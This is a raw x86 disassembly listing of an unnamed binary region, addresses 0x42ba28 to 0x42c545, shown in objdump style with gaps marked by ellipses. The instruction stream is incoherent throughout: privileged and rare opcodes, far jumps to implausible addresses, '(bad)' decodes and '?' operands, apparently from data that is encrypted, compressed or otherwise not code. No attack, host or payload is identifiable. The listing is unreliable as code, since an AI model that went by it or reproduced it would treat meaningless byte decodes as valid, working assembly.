  42ba28:	shl    DWORD PTR [esp+edx*8],cl
  42ba2b:	cmp    al,0x6e
  42ba2d:	mov    ecx,0xab1b6b3
  42ba32:	icebp  
  42ba33:	mov    BYTE PTR [esi+0x546cac3c],dl
  42ba39:	cdq    
  42ba3a:	int3   
  42ba3b:	fsub   QWORD PTR [esi+ebx*2]
  42ba3e:	retf   0xd59d
	...
  42bab1:	add    BYTE PTR [eax],al
  42bab3:	add    BYTE PTR [esi],bh
  42bab5:	push   cs
  42bab6:	sub    al,0x5d
  42bab8:	cmp    al,0x7f
  42baba:	jg     0x42bb2b
  42babc:	cmp    al,BYTE PTR [esi-0x7ebcb4]
  42bac2:	pop    ss
  42bac3:	int    0x1b
  42bac5:	into   
  42bac6:	add    DWORD PTR [eax],eax
  42bac8:	cmc    
  42bac9:	add    BYTE PTR [eax],al
  42bacb:	add    BYTE PTR [ebx-0x63],bl
  42bace:	je     0x42babb
  42bad0:	jno    0x42ba96
  42bad2:	dec    ecx
  42bad3:	in     eax,dx
  42bad4:	sbb    DWORD PTR fs:[esi-0x32],ebx
  42bad8:	sbb    eax,0x73ef4a02
  42badd:	pusha  
  42bade:	dec    eax
  42badf:	and    cl,cl
  42bae1:	xor    DWORD PTR [edi+ebx*4+0x63bd89a7],ebp
  42bae8:	mov    ?,ecx
  42baea:	pop    ebx
  42baeb:	shl    BYTE PTR [edx],1
  42baed:	mov    ah,0xfa
  42baef:	div    DWORD PTR [edi-0x2c]
  42baf2:	iret   
  42baf3:	xor    esi,ebp
  42baf5:	push   cs
  42baf6:	sti    
  42baf7:	enter  0xe34,0xd2
  42bafb:	int3   
  42bafc:	shr    BYTE PTR [edx-0x3d],1
  42baff:	pop    esi
  42bb00:	iret   
  42bb01:	mov    esp,DWORD PTR [eax]
  42bb03:	(bad)  
  42bb04:	and    BYTE PTR [ebp+0x55],dh
  42bb07:	dec    eax
  42bb08:	pop    es
  42bb09:	enter  0xca0a,0x49
  42bb0d:	xchg   ebx,eax
  42bb0e:	out    dx,eax
  42bb0f:	test   eax,0xc505a0d8
  42bb15:	mov    eax,ds:0x75c70e6c
  42bb1a:	not    BYTE PTR [ebp-0x2cc6cb39]
  42bb20:	xor    ecx,DWORD PTR [eax]
  42bb22:	int    0xff
  42bb24:	mov    ds,WORD PTR [bp+si-0x4a]
  42bb28:	fadd   DWORD PTR [eax-0x3d]
  42bb2b:	repz push ds
  42bb2d:	mov    WORD PTR [eax],fs
  42bb2f:	shr    bl,1
  42bb31:	jmp    0x86c9:0xebeeff42
  42bb38:	sbb    al,0x57
  42bb3a:	(bad)  
  42bb3c:	mov    edx,0xc27ecf6b
  42bb41:	js     0x42bae1
  42bb43:	std    
  42bb44:	neg    BYTE PTR [esi]
  42bb46:	test   DWORD PTR [ebp-0x5cf7661c],ecx
  42bb4c:	mov    ebx,esp
  42bb4e:	fwait
  42bb4f:	dec    edi
  42bb50:	lock adc DWORD PTR [edx+0x2d195b7d],0x8f0ab6fa
  42bb5b:	or     edx,ebp
  42bb5d:	jae    0x42bb29
  42bb5f:	clc    
  42bb60:	dec    edx
  42bb61:	push   edi
  42bb62:	jp     0x42bb62
  42bb64:	sbb    ah,BYTE PTR [ebx]
  42bb66:	mov    cl,0xaa
  42bb68:	fcom   DWORD PTR [esi+0x70]
  42bb6b:	dec    esp
  42bb6c:	test   al,0xa4
  42bb6e:	jns    0x42bb13
  42bb70:	or     esi,0x38c53ab1
  42bb76:	inc    edx
  42bb77:	sub    al,0xda
  42bb79:	ffree  st(3)
  42bb7b:	cli    
  42bb7c:	xchg   edi,eax
  42bb7d:	or     BYTE PTR [edx-0x41],0x4b
  42bb81:	sub    BYTE PTR [ebp+0x74546c9e],cl
  42bb87:	ret    
  42bb88:	dec    esi
  42bb89:	sti    
  42bb8a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42bb8b:	mov    BYTE PTR [edx],bh
  42bb8d:	inc    edi
  42bb8e:	adc    al,0xb8
  42bb90:	sub    DWORD PTR [edi],0x294bcc59
  42bb96:	(bad)  
  42bb97:	mov    edi,0xb433d6ac
  42bb9c:	sbb    ebp,eax
  42bb9e:	jmp    0x3a1b70b2
  42bba3:	dec    eax
  42bba4:	mov    ah,0x4a
  42bba6:	in     al,dx
  42bba7:	push   edi
  42bba8:	mov    ss,edi
  42bbaa:	in     eax,0x77
  42bbac:	pop    ds
  42bbad:	shl    BYTE PTR [ecx+0x275f1cb9],1
  42bbb3:	adc    ecx,edx
  42bbb5:	mov    dh,0x31
  42bbb7:	das    
  42bbb8:	jp     0x42bbe4
  42bbba:	cmp    al,0xba
  42bbbc:	aam    0xee
  42bbbe:	lods   eax,DWORD PTR ds:[esi]
  42bbbf:	fsub   st,st(0)
	...
  42bc31:	add    BYTE PTR [eax],al
  42bc33:	add    cl,ch
  42bc35:	xor    bl,BYTE PTR [edx+edi*1]
  42bc38:	fistp  QWORD PTR [esi]
  42bc3a:	out    dx,eax
  42bc3b:	repz ffreep st(2)
  42bc3e:	(bad)  
  42bc3f:	aam    0x70
  42bc41:	mov    cl,0x56
  42bc43:	iret   
  42bc44:	adc    bh,cl
  42bc46:	add    DWORD PTR [eax],eax
  42bc48:	cmc    
  42bc49:	add    BYTE PTR [eax],al
  42bc4b:	add    BYTE PTR [ebx+0x3321afe1],dh
  42bc51:	or     ebp,esp
  42bc53:	mov    esi,?
  42bc55:	push   edi
  42bc56:	mov    edi,0xcfb55a2f
  42bc5b:	imul   BYTE PTR [esi+0x68e58ebd]
  42bc61:	xchg   esp,eax
  42bc62:	adc    ah,BYTE PTR [ebp-0x10ced892]
  42bc68:	cli    
  42bc69:	jle    0x42bc22
  42bc6b:	push   ss
  42bc6c:	stos   BYTE PTR es:[edi],al
  42bc6d:	pop    ecx
  42bc6e:	enter  0x6361,0xe2
  42bc72:	test   DWORD PTR [eax+0x4a090fc],edx
  42bc78:	cli    
  42bc79:	ins    BYTE PTR es:[edi],dx
  42bc7a:	xchg   esi,eax
  42bc7b:	and    DWORD PTR [eax],esi
  42bc7d:	jmp    0x42bc18
  42bc7f:	xor    al,0x1e
  42bc81:	xor    DWORD PTR [esp+ebp*1+0x22a44baf],eax
  42bc88:	cmp    DWORD PTR [ebx-0x4c],0xffffffd7
  42bc8c:	add    ch,dh
  42bc8e:	scas   eax,DWORD PTR es:[edi]
  42bc8f:	js     0x42bd0e
  42bc91:	js     0x42bcc4
  42bc93:	mov    bl,0x9d
  42bc95:	xchg   DWORD PTR [ebx],ecx
  42bc97:	pop    es
  42bc98:	loopne 0x42bca6
  42bc9a:	mov    edi,0x426c4f71
  42bc9f:	xchg   ebx,eax
  42bca0:	inc    esp
  42bca1:	xor    bl,BYTE PTR [eax+0x3b]
  42bca4:	aas    
  42bca5:	mov    ds:0xafcd65c3,al
  42bcaa:	sbb    ah,al
  42bcac:	xor    esi,DWORD PTR [ebp+0x47c3e124]
  42bcb2:	ret    
  42bcb3:	adc    al,0xe5
  42bcb5:	jl     0x42bc8f
  42bcb7:	cmp    eax,0x8f2f236e
  42bcbc:	popf   
  42bcbd:	sub    edi,DWORD PTR [esi-0x3e]
  42bcc0:	jge    0x42bc5f
  42bcc2:	(bad)  
  42bcc3:	xchg   ecx,eax
  42bcc4:	xchg   esp,eax
  42bcc5:	mov    dh,0x86
  42bcc7:	and    eax,0x81d5018f
  42bccc:	dec    esi
  42bccd:	test   BYTE PTR [eax+ebp*2+0x25],bh
  42bcd1:	xor    BYTE PTR [esi-0x53],0xf
  42bcd5:	sti    
  42bcd6:	test   eax,0x794c35c6
  42bcdb:	arpl   WORD PTR [ecx],ax
  42bcdd:	ret    0x8005
  42bce0:	out    dx,eax
  42bce1:	xchg   edi,eax
  42bce2:	push   ebp
  42bce3:	cmp    al,0x66
  42bce5:	nop
  42bce6:	arpl   dx,si
  42bce8:	aaa    
  42bce9:	sahf   
  42bcea:	dec    eax
  42bceb:	not    BYTE PTR [ecx+esi*8+0x36]
  42bcef:	dec    edi
  42bcf0:	mov    eax,ds:0x8551842f
  42bcf5:	jmp    0x8672:0x4f041f61
  42bcfc:	jl     0x42bd2a
  42bcfe:	jmp    0xf399:0x986a6c11
  42bd05:	xor    dl,BYTE PTR [ebx-0x682b60a1]
  42bd0b:	(bad)  
  42bd0c:	and    edx,0xffffffa7
  42bd0f:	mov    bl,0x49
  42bd11:	add    eax,0x963237d4
  42bd17:	sub    DWORD PTR [ecx+0x50],ecx
  42bd1a:	mov    ?,WORD PTR [esp+edi*2+0x30]
  42bd1e:	sbb    bl,BYTE PTR [ecx+eax*1]
  42bd21:	jae    0x5c89af94
  42bd27:	or     DWORD PTR [ebp-0x366cc2f3],edx
  42bd2d:	ret    
  42bd2e:	fadd   DWORD PTR [eax+edx*1-0x40ccea23]
  42bd35:	clc    
  42bd36:	test   dl,dh
  42bd38:	or     DWORD PTR [ebp+0x2],esp
  42bd3b:	inc    ecx
  42bd3c:	jae    0x42bdaf
  42bd3e:	jp     0x42bd3a
  42bd40:	pop    ss
	...
  42bdb1:	add    BYTE PTR [eax],al
  42bdb3:	add    BYTE PTR [edi+0x4a8e4af7],bh
  42bdb9:	mov    edi,0x5143f7ff
  42bdbe:	jne    0x42bdcc
  42bdc0:	stos   BYTE PTR es:[edi],al
  42bdc1:	or     dl,bh
  42bdc3:	les    eax,FWORD PTR ds:0xf50001d0
  42bdc9:	add    BYTE PTR [eax],al
  42bdcb:	add    BYTE PTR [ebp-0x22],al
  42bdce:	xchg   ecx,eax
  42bdcf:	push   0xe2edd698
  42bdd4:	mov    eax,0xfa8638ea
  42bdd9:	inc    esp
  42bdda:	xchg   ebx,eax
  42bddb:	cli    
  42bddc:	mov    ds:0x57bcc95d,eax
  42bde1:	push   esp
  42bde2:	je     0x42bd8e
  42bde4:	jo     0x42be0a
  42bde6:	add    dh,BYTE PTR [ecx]
  42bde8:	or     ebp,ebx
  42bdea:	lds    ecx,FWORD PTR [ebx+ebx*4+0x18303ae3]
  42bdf1:	mov    ds:0x93614806,eax
  42bdf6:	and    eax,0xc9f28cd0
  42bdfb:	inc    eax
  42bdfc:	enter  0x9ebb,0xa4
  42be00:	sbb    al,0x8
  42be02:	mov    eax,ds:0x27dbfe18
  42be07:	retf   
  42be08:	call   0x2af1e14a
  42be0d:	(bad)  
  42be0e:	fnstenv [ecx-0x2b]
  42be11:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42be12:	in     eax,0x3b
  42be14:	pop    esp
  42be15:	mov    cl,0xcc
  42be17:	sub    al,0x41
  42be19:	retf   0x2a4f
  42be1c:	xchg   edi,eax
  42be1d:	jnp    0x42be77
  42be1f:	stos   DWORD PTR es:[edi],eax
  42be20:	mov    ch,ch
  42be22:	cs sub eax,0x9eaeab2e
  42be28:	clc    
  42be29:	or     ecx,DWORD PTR [ecx+0x6ad3e9c5]
  42be2f:	push   edi
  42be30:	push   cs
  42be31:	enter  0x3a1b,0xe9
  42be35:	lds    ebp,FWORD PTR [esi-0x3f]
  42be38:	rol    ebp,0x79
  42be3b:	cmp    edi,ebx
  42be3d:	add    ebp,0xffffffd9
  42be40:	ret    
  42be41:	adc    eax,0xe3859193
  42be46:	jae    0x42bdca
  42be48:	sbb    al,0x4f
  42be4a:	jl     0x42bdd8
  42be4c:	jno    0x42be27
  42be4e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42be4f:	push   esi
  42be50:	adc    DWORD PTR [edi-0x1e5eb073],ebp
  42be56:	mov    BYTE PTR [ebp-0x59],bh
  42be59:	mov    al,0x41
  42be5b:	pop    eax
  42be5c:	inc    ebp
  42be5d:	cmp    BYTE PTR [ebx-0x17],dh
  42be60:	fiadd  WORD PTR [ebx+0x2b]
  42be63:	cmp    BYTE PTR ds:[esi],dl
  42be66:	data16 and bh,BYTE PTR [ecx+eax*4+0x39]
  42be6b:	xchg   ecx,eax
  42be6c:	dec    ecx
  42be6d:	xchg   edi,eax
  42be6e:	repnz popa 
  42be70:	xor    al,0x10
  42be72:	push   ebp
  42be73:	mov    WORD PTR [ebx+0x23],?
  42be76:	push   eax
  42be77:	sbb    al,0x8f
  42be79:	or     cl,BYTE PTR [ecx+ebp*2]
  42be7c:	jl     0x42bee0
  42be7e:	cwde   
  42be7f:	push   cs
  42be80:	dec    esi
  42be81:	cwde   
  42be82:	push   esp
  42be83:	fld    TBYTE PTR [ecx]
  42be85:	mov    ecx,0x3da2f925
  42be8a:	call   0x39dab0a
  42be8f:	xchg   BYTE PTR [eax],ch
  42be91:	sub    DWORD PTR [esi+0x69],esi
  42be94:	pop    eax
  42be95:	outs   dx,DWORD PTR ds:[esi]
  42be96:	xchg   esp,eax
  42be97:	cmc    
  42be98:	sbb    bh,BYTE PTR ds:0xa9b58163
  42be9e:	xor    DWORD PTR [edx-0x7ac97883],0x4664fe5c
  42bea8:	loopne 0x42be9f
  42beaa:	dec    edi
  42beab:	cmp    esp,DWORD PTR [esp+eiz*2-0x54]
  42beaf:	cld    
  42beb0:	mov    bl,bl
  42beb2:	ins    BYTE PTR es:[edi],dx
  42beb3:	sbb    al,0x32
  42beb5:	dec    eax
  42beb6:	inc    ebx
  42beb7:	sti    
  42beb8:	pop    edx
  42beb9:	fcmovu st,st(3)
  42bebb:	clc    
  42bebc:	sub    edi,DWORD PTR [ebp+edx*4-0x7b]
  42bec0:	sbb    eax,0x0
	...
  42bf31:	add    BYTE PTR [eax],al
  42bf33:	add    cl,bh
  42bf35:	enter  0xdc7a,0x7b
  42bf39:	(bad)  
  42bf3a:	(bad)  
  42bf3b:	in     eax,dx
  42bf3c:	out    dx,al
  42bf3d:	mov    ah,0x3
  42bf3f:	dec    ecx
  42bf40:	sub    esi,DWORD PTR ds:0xd0fa3d85
  42bf46:	add    DWORD PTR [eax],eax
  42bf48:	cmc    
  42bf49:	add    BYTE PTR [eax],al
  42bf4b:	add    BYTE PTR [ecx+ecx*1],dh
  42bf4e:	test   BYTE PTR [eax+eax*1+0x152634a0],bh
  42bf55:	sub    cl,BYTE PTR [eax+ecx*1]
  42bf58:	and    DWORD PTR [ebp+0x24],esi
  42bf5b:	inc    eax
  42bf5c:	aam    0x30
  42bf5e:	mov    DWORD PTR [edx-0x6aff7b2d],esp
  42bf64:	(bad)  
  42bf66:	sbb    BYTE PTR [esi+edi*8+0x56],0x42
  42bf6b:	out    dx,eax
  42bf6c:	mov    ah,0xda
  42bf6e:	outs   dx,DWORD PTR ds:[esi]
  42bf6f:	dec    ebx
  42bf70:	adc    al,0xda
  42bf72:	jns    0xe972c1c5
  42bf78:	mov    cl,0x42
  42bf7a:	sbb    edx,DWORD PTR [ecx+0x39]
  42bf7d:	jmp    0x42bfc9
  42bf7f:	dec    ebp
  42bf80:	pop    edx
  42bf81:	mov    al,ds:0x46462b70
  42bf86:	stc    
  42bf87:	sahf   
  42bf88:	dec    eax
  42bf89:	and    DWORD PTR [edx],eax
  42bf8b:	repnz sbb cl,BYTE PTR [esi+ecx*4-0x2d46f09e]
  42bf93:	inc    ebx
  42bf94:	addr16 (bad) 
  42bf96:	cmp    bh,cl
  42bf98:	out    0x47,eax
  42bf9a:	dec    ebp
  42bf9b:	jb     0x42bfd4
  42bf9d:	call   0x4730:0x61a9e8a9
  42bfa4:	cmp    edx,DWORD PTR [ebx-0x19135aa2]
  42bfaa:	push   es
  42bfab:	add    al,0x61
  42bfad:	push   edi
  42bfae:	(bad)  
  42bfaf:	psubw  mm2,QWORD PTR [ecx+0x1a]
  42bfb3:	dec    esp
  42bfb4:	pop    eax
  42bfb5:	mov    edx,DWORD PTR [ebx+0x4269e61a]
  42bfbb:	aam    0xfd
  42bfbd:	nop
  42bfbe:	or     al,bh
  42bfc0:	add    al,dl
  42bfc2:	mov    eax,ds:0x8d73349c
  42bfc7:	inc    eax
  42bfc8:	hlt    
  42bfc9:	push   cs
  42bfca:	mul    BYTE PTR [ecx+0x5a77d1dd]
  42bfd0:	push   ecx
  42bfd1:	inc    edx
  42bfd2:	mov    esi,0x21a8744c
  42bfd7:	(bad)  
  42bfd8:	ins    DWORD PTR es:[edi],dx
  42bfd9:	cmp    eax,0xb2254159
  42bfde:	cmp    cl,dl
  42bfe0:	mov    DWORD PTR [eax],esi
  42bfe2:	imul   eax,DWORD PTR [edx+0x19],0xffffffc2
  42bfe6:	fisubr WORD PTR [ecx]
  42bfe8:	push   eax
  42bfe9:	aaa    
  42bfea:	mov    ds:0xdc90fd7d,al
  42bfef:	and    DWORD PTR [esp+esi*1],ebp
  42bff2:	inc    edi
  42bff3:	or     al,ah
  42bff5:	push   0xb29c5eb5
  42bffa:	dec    edx
  42bffb:	or     eax,0xa6eee0dc
  42c000:	test   DWORD PTR [esi-0x4c17b2c2],esp
  42c006:	outs   dx,DWORD PTR ds:[esi]
  42c007:	repnz push ss
  42c009:	sbb    DWORD PTR [edi],esp
  42c00b:	int    0x37
  42c00d:	fbstp  TBYTE PTR [ecx-0x1858edde]
  42c013:	mov    ebp,0xb3a09b6a
  42c018:	mov    BYTE PTR [ebp-0xb0efc7f],dl
  42c01e:	mov    al,0xd7
  42c020:	imul   esi,DWORD PTR [eax+0x20],0x78
  42c024:	arpl   WORD PTR [eax-0x83f1f64],si
  42c02a:	int    0xf1
  42c02c:	call   0x4e5a7d36
  42c031:	and    BYTE PTR [eax],bh
  42c033:	cmp    eax,0xa2cccf62
  42c038:	retf   0xf63c
  42c03b:	xor    DWORD PTR [ebp-0x2740451e],eax
	...
  42c0b1:	add    BYTE PTR [eax],al
  42c0b3:	add    BYTE PTR [ebp+0x25],dh
  42c0b6:	imul   ebx,DWORD PTR [edi-0x51]
  42c0ba:	cmc    
  42c0bb:	(bad)  
  42c0bc:	call   0x1e942915
  42c0c1:	sub    cl,BYTE PTR [ecx]
  42c0c3:	push   esp
  42c0c4:	out    dx,eax
  42c0c5:	rol    DWORD PTR [ecx],1
  42c0c7:	add    ch,dh
  42c0c9:	add    BYTE PTR [eax],al
  42c0cb:	add    cl,ch
  42c0cd:	lock mov ds:0x62ebd8d5,eax
  42c0d3:	mov    ds:0x10ac9556,eax
  42c0d8:	add    eax,0x8cf2dae7
  42c0dd:	and    eax,0x75bf336e
  42c0e2:	jo     0x42c150
  42c0e4:	sub    DWORD PTR [esi+0x25],esp
  42c0e7:	clc    
  42c0e8:	stos   DWORD PTR es:[edi],eax
  42c0e9:	push   0x84a0a8ec
  42c0ee:	sti    
  42c0ef:	test   al,0xd6
  42c0f1:	(bad)  
  42c0f2:	int    0x56
  42c0f4:	ret    0x2078
  42c0f7:	jo     0x42c13b
  42c0f9:	fnsave [esi]
  42c0fb:	arpl   cx,bp
  42c0fd:	and    al,0xe6
  42c0ff:	stos   DWORD PTR es:[edi],eax
  42c100:	fsubrp st(4),st
  42c102:	mov    dh,BYTE PTR [ebp-0x3d98d56f]
  42c108:	mov    ds:0xcf572329,eax
  42c10d:	mov    eax,DWORD PTR [edi-0x17b58f0c]
  42c113:	lods   eax,DWORD PTR ds:[esi]
  42c114:	push   DWORD PTR [ecx-0x41]
  42c117:	fist   DWORD PTR [ebp-0x5f139e1]
  42c11d:	and    DWORD PTR [eax+edi*8+0xdf6d089],ecx
  42c124:	jnp    0x42c0e8
  42c126:	and    bh,bl
  42c128:	mov    bl,BYTE PTR es:[eax+0x2da5c358]
  42c12f:	ins    DWORD PTR es:[edi],dx
  42c130:	push   esi
  42c131:	call   0x8928:0x672f7445
  42c138:	sub    DWORD PTR [edi],0x9b5bb3ec
  42c13e:	stos   BYTE PTR es:[edi],al
  42c13f:	mov    dl,0x2b
  42c141:	fisubr DWORD PTR [esi+0x3208d2de]
  42c147:	mov    al,ds:0xaa226ad0
  42c14c:	xchg   esp,eax
  42c14d:	retf   0xac2d
  42c150:	sub    DWORD PTR [esi-0x1121c6c9],esi
  42c156:	mov    ds:0xa95ca3c3,eax
  42c15b:	popa   
  42c15c:	pop    ebp
  42c15d:	xor    BYTE PTR [ecx],0xe1
  42c160:	dec    edx
  42c161:	cmp    eax,0xd7b0b707
  42c166:	fild   WORD PTR [ecx]
  42c168:	arpl   WORD PTR ds:0xcf5b5496,cx
  42c16e:	cmovno esp,ebp
  42c171:	stos   DWORD PTR es:[edi],eax
  42c172:	and    DWORD PTR [ebx-0x62],0x48f0508d
  42c179:	sub    edx,eax
  42c17b:	push   esi
  42c17c:	ror    DWORD PTR [esi+0x3],cl
  42c17f:	sbb    esp,DWORD PTR [edx]
  42c181:	adc    eax,0xc9c70a2b
  42c186:	lods   al,BYTE PTR ds:[esi]
  42c187:	scas   eax,DWORD PTR es:[edi]
  42c188:	sub    al,0xe4
  42c18a:	sahf   
  42c18b:	add    cl,dl
  42c18d:	cmp    DWORD PTR [ecx-0xc],0x260ac7f
  42c194:	mov    cl,0xdf
  42c196:	ja     0x42c1fa
  42c198:	pop    esi
  42c199:	scas   eax,DWORD PTR es:[edi]
  42c19a:	(bad)
  42c19e:	data16 jnp 0x42c125
  42c1a1:	mov    dh,0x59
  42c1a3:	(bad)  
  42c1a4:	sub    ecx,DWORD PTR [edi-0x4330db9b]
  42c1aa:	cmp    al,BYTE PTR [eax-0x1839cd48]
  42c1b0:	repz sti 
  42c1b2:	imul   edx,esi,0x3c
  42c1b5:	dec    edi
  42c1b6:	add    al,0x12
  42c1b8:	popa   
  42c1b9:	lahf   
  42c1ba:	(bad)  
  42c1bb:	cs jo  0x42c1c0
  42c1be:	movzx  esi,dl
	...
  42c231:	add    BYTE PTR [eax],al
  42c233:	add    BYTE PTR [ebp-0x449f6672],ah
  42c239:	ja     0x42c238
  42c23b:	iret   
  42c23c:	xchg   esp,eax
  42c23d:	xor    edx,DWORD PTR [ecx+ebp*1+0x7f]
  42c241:	stos   DWORD PTR es:[edi],eax
  42c242:	jp     0x42c1ed
  42c244:	in     al,0xd2
  42c246:	add    DWORD PTR [eax],eax
  42c248:	cmc    
  42c249:	add    BYTE PTR [eax],al
  42c24b:	add    BYTE PTR [edx+0x4ed03b4a],bh
  42c251:	sbb    ah,ch
  42c253:	loope  0x42c2be
  42c255:	jno    0x42c245
  42c257:	or     ebp,DWORD PTR [edi-0x23d7bfec]
  42c25d:	imul   edx,DWORD PTR [edi+edx*2-0x14],0xffffff9e
  42c262:	adc    bl,BYTE PTR [ecx-0x55]
  42c265:	cmp    BYTE PTR [ebp-0x2f],cl
  42c268:	inc    edi
  42c269:	lods   eax,DWORD PTR gs:[esi]
  42c26b:	aad    0x39
  42c26d:	jge    0x42c26f
  42c26f:	popf   
  42c270:	inc    edx
  42c271:	test   edx,0x7492f717
  42c277:	mov    ah,BYTE PTR [edi-0x2c]
  42c27a:	adc    esp,ebx
  42c27c:	jle    0x42c2cc
  42c27e:	jecxz  0x42c290
  42c280:	loope  0x42c2a0
  42c282:	inc    edi
  42c283:	call   0x13f10ebd
  42c288:	pushf  
  42c289:	sahf   
  42c28a:	sbb    BYTE PTR [ebx],0x6
  42c28d:	and    DWORD PTR [ebp-0x7c],edx
  42c290:	daa    
  42c291:	push   esp
  42c292:	and    eax,DWORD PTR [edi-0x490444c3]
  42c298:	xor    al,0xe4
  42c29a:	imul   edx,DWORD PTR [ebx],0xfffffffe
  42c29d:	(bad)  
  42c29e:	std    
  42c29f:	(bad)  
  42c2a0:	and    DWORD PTR [edi+0x8],eax
  42c2a3:	into   
  42c2a4:	shl    sp,cl
  42c2a7:	icebp  
  42c2a8:	fcmovb st,st(3)
  42c2aa:	stc    
  42c2ab:	mov    ebx,0x3591e9de
  42c2b0:	mov    ds:0x5dda4f75,al
  42c2b5:	jbe    0x42c268
  42c2b7:	sub    esp,DWORD PTR [eax]
  42c2b9:	scas   eax,DWORD PTR es:[edi]
  42c2ba:	mov    al,ds:0xc943d991
  42c2bf:	ins    BYTE PTR es:[edi],dx
  42c2c0:	xor    BYTE PTR [ebx],dh
  42c2c2:	into   
  42c2c3:	int3   
  42c2c4:	lahf   
  42c2c5:	int    0x58
  42c2c7:	inc    ecx
  42c2c8:	or     esi,ecx
  42c2ca:	mov    edx,0x8139e5e0
  42c2cf:	push   cs
  42c2d0:	or     esp,DWORD PTR [eax-0x22]
  42c2d3:	jmp    0x42c2b4
  42c2d5:	cmp    BYTE PTR [esi+edx*8+0x6693a98e],bl
  42c2dc:	retf   0x162f
  42c2df:	pop    eax
  42c2e0:	push   0xffffffc4
  42c2e2:	fnsave [ecx]
  42c2e4:	in     al,dx
  42c2e5:	adc    eax,0xff599ddf
  42c2ea:	adc    DWORD PTR [ecx+edx*1],0xa6d7382
  42c2f1:	addr16 ror ch,0xc
  42c2f5:	xchg   DWORD PTR [edx-0x38],eax
  42c2f8:	aam    0xf9
  42c2fa:	push   ebx
  42c2fb:	sbb    DWORD PTR [ecx+0x6c581392],esp
  42c301:	test   BYTE PTR [ebx],cl
  42c303:	xor    al,0xca
  42c305:	xlat   BYTE PTR ds:[ebx]
  42c306:	test   BYTE PTR [ecx+ebx*8],bl
  42c309:	and    BYTE PTR [edi-0x7ee1c219],0x5c
  42c310:	cwde   
  42c311:	dec    ecx
  42c312:	enter  0x2a8b,0xbf
  42c316:	pop    edi
  42c317:	rcl    BYTE PTR [esp+ebx*2+0x7b08f330],0xe1
  42c31f:	adc    eax,0x80a0b9e0
  42c324:	adc    esp,ebx
  42c326:	ret    0xc51a
  42c329:	fdivr  DWORD PTR [esi-0x36e4a5e1]
  42c32f:	dec    edx
  42c330:	mov    esp,0x75a81a4d
  42c335:	test   edx,0xea565a8
  42c33b:	enter  0x72db,0x4d
  42c33f:	mov    eax,ds:0xbc
	...
  42c3b4:	mov    al,BYTE PTR [ebp+0x20]
  42c3b7:	out    dx,al
  42c3b8:	out    dx,eax
  42c3b9:	out    dx,eax
  42c3ba:	into   
  42c3bb:	gs aam 0xa
  42c3be:	fst    DWORD PTR [ecx-0x53]
  42c3c1:	je     0x42c3b8
  42c3c3:	jl     0x42c39e
  42c3c5:	rol    DWORD PTR [ecx],cl
  42c3c7:	add    ch,dh
  42c3c9:	add    BYTE PTR [eax],al
  42c3cb:	add    BYTE PTR [ebx-0x689aa6d3],dl
  42c3d1:	stos   DWORD PTR es:[edi],eax
  42c3d2:	out    dx,al
  42c3d3:	lock jle 0x42c44b
  42c3d6:	lods   al,BYTE PTR ds:[esi]
  42c3d7:	add    al,0xa1
  42c3d9:	mov    esi,0xd54def65
  42c3de:	je     0x42c3b1
  42c3e0:	sahf   
  42c3e1:	add    eax,0xbd210d18
  42c3e6:	xor    eax,0xc95617e7
  42c3eb:	call   0x2287f8d2
  42c3f0:	ja     0x42c403
  42c3f2:	test   al,0x5a
  42c3f4:	mov    ch,BYTE PTR [esi]
  42c3f6:	mov    ecx,0x56ca7b40
  42c3fb:	fdiv   QWORD PTR [ebx-0x6a20c5e5]
  42c401:	cmp    BYTE PTR [edi],0x5
  42c404:	fmulp  st(3),st
  42c406:	xchg   edx,eax
  42c407:	inc    di
  42c409:	add    DWORD PTR [edx],esp
  42c40b:	imul   eax,DWORD PTR ds:0xe4411ebc,0xffffffc3
  42c412:	(bad)  
  42c413:	adc    esi,DWORD PTR [ebx-0x3f]
  42c416:	pop    ebp
  42c417:	inc    bx
  42c419:	inc    esp
  42c41a:	xchg   esi,eax
  42c41b:	sbb    BYTE PTR [ebp-0x365fa54e],al
  42c421:	fmul   QWORD PTR [edx+edi*1-0x41]
  42c425:	adc    eax,0x25b6c0ff
  42c42a:	ror    DWORD PTR [ebx+0xdd271e7],1
  42c430:	inc    edx
  42c431:	repnz mov ecx,0xa15dca44
  42c437:	popa   
  42c438:	push   ss
  42c439:	fidivr DWORD PTR [esp]
  42c43c:	dec    ecx
  42c43d:	daa    
  42c43e:	mov    al,0xf2
  42c440:	adc    eax,0x20684d58
  42c445:	dec    ecx
  42c446:	data16 repz sbb dl,bh
  42c44a:	and    al,0xb5
  42c44c:	sbb    al,0x91
  42c44e:	aad    0x77
  42c450:	cmp    dh,BYTE PTR [edx-0xe]
  42c453:	xor    edi,DWORD PTR [edi+0x59f84492]
  42c459:	push   ecx
  42c45a:	mov    eax,ds:0x26a5c5d6
  42c45f:	jns    0x42c3e9
  42c461:	daa    
  42c462:	loopne 0x42c45c
  42c464:	ds push ebp
  42c466:	dec    ebp
  42c467:	sub    BYTE PTR [ebx-0x73],bl
  42c46a:	(bad)
  42c46f:	pushf  
  42c470:	mov    edi,0x9b1c57c3
  42c475:	push   0xff0f27e9
  42c47a:	and    DWORD PTR [esi+0x5],ebp
  42c47d:	pop    ecx
  42c47e:	add    eax,0xc226e5ee
  42c483:	out    0xba,eax
  42c485:	inc    ebp
  42c486:	clc    
  42c487:	push   ds
  42c488:	lock xlat BYTE PTR ds:[ebx]
  42c48a:	mov    WORD PTR [ecx+0x72f68329],?
  42c490:	sub    esp,DWORD PTR [ecx+0x44]
  42c493:	rcr    DWORD PTR [eax],0xa6
  42c496:	fld    TBYTE PTR [eax+0x2fea08e5]
  42c49c:	mov    ds:0x92d271dd,eax
  42c4a1:	xor    cl,BYTE PTR [edi-0x39]
  42c4a4:	xchg   esi,eax
  42c4a5:	xchg   DWORD PTR [ebp+0x27],esi
  42c4a8:	sbb    BYTE PTR [esi+ebp*4],0x7a
  42c4ac:	jae    0x42c496
  42c4ae:	xor    eax,0x7090a733
  42c4b3:	jle    0x42c435
  42c4b5:	push   ecx
  42c4b6:	jp     0x42c452
  42c4b8:	mov    dh,0x19
  42c4ba:	jecxz  0x42c44e
  42c4bc:	fisub  DWORD PTR [ebp-0x31]
  42c4bf:	mov    ds:0x28,al
	...
  42c534:	loopne 0x42c4ca
  42c536:	and    bh,cl
  42c538:	je     0x42c539
  42c53a:	out    dx,eax
  42c53b:	mov    edi,0x9a7cd6c5
  42c540:	push   cs
  42c541:	lahf   
  42c542:	rol    esi,cl
  42c544:	into   
  42c545:	aam    0x1
